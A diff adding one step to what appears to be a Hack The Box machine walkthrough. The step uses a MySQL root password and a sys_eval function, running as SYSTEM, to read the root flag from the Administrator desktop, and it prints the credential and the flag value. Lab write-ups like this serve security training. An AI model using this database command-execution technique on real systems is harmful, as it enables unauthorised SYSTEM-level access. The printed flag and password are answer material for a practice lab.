@@ -972,6 +972,40 @@ nt authority\system
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 4.9 Read the root flag as SYSTEM (Privilege Escalation)
+
+**Why this step:** With an inline SYSTEM command primitive (4.8), read the root objective from the Administrator desktop.
+
+**Command:**
+
+```
+C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt');"
+```
+
+**Breakdown:**
+
+|Component|Meaning|
+|---|---|
+|`sys_eval('type ...')`|Run `type` on the flag file as SYSTEM and return its contents.|
+|`C:\\Users\\...`|Backslashes doubled so MySQL's string parser does not interpret `\r` (and similar) as escape sequences.|
+
+**Result:**
+
+```
+sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt')
+ad8b2904c76222ed610526c1b68ef135
+```
+
+**What this gives you:** The root flag. **ROOT FLAG: `ad8b2904c76222ed610526c1b68ef135`**
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
